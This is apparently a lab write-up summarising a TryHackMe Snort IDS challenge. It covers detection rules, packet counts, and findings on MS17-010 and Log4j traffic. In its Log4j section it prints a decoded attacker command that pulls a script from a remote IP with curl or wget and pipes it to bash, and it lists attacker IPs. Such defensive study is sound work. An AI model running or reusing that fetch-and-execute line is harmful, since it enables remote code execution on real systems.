# Snort Challenge: The Basics - Executive Summary

## Overview

Successfully completed TryHackMe's "Snort Challenge - The Basics" room, demonstrating proficiency in:
- Snort IDS rule creation and deployment
- Network traffic analysis with tshark
- Rule syntax troubleshooting
- Detection of major vulnerabilities (MS17-010, Log4j)

## Completion Statistics

| Metric | Value |
|--------|-------|
| **Difficulty** | Medium |
| **Total Questions** | 40 |
| **Correct Answers** | 40 |
| **Success Rate** | 100% |
| **Time Spent** | 90 minutes |
| **Points Earned** | 600 |

## Skills Demonstrated

### 1. IDS Rule Writing
- Created bidirectional HTTP traffic rules (TCP port 80)
- Developed FTP authentication detection rules (TCP port 21)
- Implemented file type detection (PNG, GIF)
- Built Torrent metafile detection rules

### 2. Traffic Analysis
- Analyzed 164 HTTP packets
- Investigated 307 FTP packets
- Detected 2 torrent packets
- Examined 25,154 packets for MS17-010
- Analyzed 26 packets for Log4j exploitation

### 3. Syntax Troubleshooting
- Fixed 7 different Snort rule files
- Identified missing required options (msg, sid, rev)
- Corrected syntax errors across multiple rule types
- Validated rules using `-A console` mode

### 4. Vulnerability Detection

#### MS17-010 (EternalBlue)
- Detected 12 packets containing IPC$ keyword
- Identified malicious path: `\\192.168.116.138\\IPC$`
- CVSS v2 Score: 9.3 (Critical)

#### Log4j (CVE-2021-44228)
- Detected Base64-encoded payloads
- Identified 4 triggered rules (SID: 210037*)
- Decoded attacker command:
  ```bash
  (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
  ```
- CVSS v2 Score: 9.3 (Critical)

## Key Findings

### Protocol Analysis
| Protocol | Port | Packets | Purpose |
|----------|------|---------|---------|
| HTTP | 80 | 164 | Web traffic |
| FTP | 21 | 307 | File transfer (41 failed logins) |
| SMB | 445 | 12 | MS17-010 exploitation |
| HTTP | Various | 26 | Log4j exploitation |

### Attack Patterns Identified
1. **Brute-force attacks**: 41 failed FTP login attempts
2. **Remote code execution**: Log4j Base64 payload
3. **Lateral movement**: MS17-010 IPC$ access
4. **Data exfiltration**: Torrent metafile detection

## Technical Achievements

### Snort Rule Examples Created

**HTTP Bidirectional Detection:**
```snort
alert tcp any any -> any 80 (msg:"TCP port 80 outbound traffic"; sid:1000000000001; rev:1)
alert tcp any 80 -> any any (msg:"TCP port 80 inbound traffic"; sid:1000000000002; rev:1)
```

**FTP Authentication Monitoring:**
```snort
alert tcp any 21 -> any any (content:"530"; msg:"Failed FTP login"; sid:100002; rev:1)
alert tcp any 21 -> any any (content:"230"; msg:"Successful FTP login"; sid:100003; rev:1)
alert tcp any 21 -> any any (content:"331"; msg:"Password required"; sid:100004; rev:1)
```

**Payload Size Detection (Log4j):**
```snort
alert tcp any any -> any any (dsize:770<>855; msg:"Suspicious payload size"; sid:100007; rev:1)
```

## Indicators of Compromise (IOCs)

### MS17-010 Attack
- **Target**: 192.168.116.138
- **Path**: \\192.168.116.138\\IPC$
- **Packets**: 12
- **Severity**: Critical (CVSS 9.3)

### Log4j Attack
- **Attack IPs**: 45.155.205.233, 162.0.228.253
- **Encoding**: Base64
- **Method**: Remote code execution via curl/wget
- **Packets**: 26 (41 in size range 770-855 bytes)
- **Severity**: Critical (CVSS 9.3)

## Lessons Learned

1. **Rule Structure**: Proper Snort rule syntax requires msg, sid, and rev at minimum
2. **Bidirectional Traffic**: Always consider both directions for complete coverage
3. **Content Matching**: Specific string patterns improve detection accuracy
4. **Testing**: Use `-A console` mode before deploying rules in `-A full` mode
5. **Size Filters**: The `dsize` keyword is effective for detecting anomalous payloads
6. **Encoding Detection**: Base64 is commonly used to obfuscate malicious payloads

## Recommendations

1. **Deploy bidirectional rules** for critical protocols (HTTP, FTP, SMB)
2. **Monitor authentication failures** to detect brute-force attacks
3. **Implement size-based detection** for known exploit patterns
4. **Update rule sets regularly** with latest CVE signatures
5. **Test rules thoroughly** before production deployment
6. **Log all alerts** for forensic analysis and incident response

## Conclusion

This challenge successfully demonstrated comprehensive Snort IDS capabilities, from basic rule writing to advanced vulnerability detection. The ability to identify and block critical threats like MS17-010 and Log4j showcases the importance of network security monitoring in modern defense strategies.

**Status**: ✅ 100% Complete
**Certification**: Snort IDS Rule Writing
**Date**: 2025-12-26

---

**Analyst**: Salim Hadda
**Platform**: TryHackMe
**Category**: Network Security Monitoring
